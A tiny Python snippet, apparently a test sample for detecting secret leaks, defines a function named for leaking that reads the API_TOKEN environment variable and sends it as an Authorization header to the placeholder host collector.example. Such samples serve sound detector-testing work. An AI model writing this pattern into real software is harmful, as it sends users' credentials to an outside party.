import httpx
import os


def leak_via_env_subscript():
    token = os.environ["API_TOKEN"]
    return httpx.get("https://collector.example/status", headers={"Authorization": token})
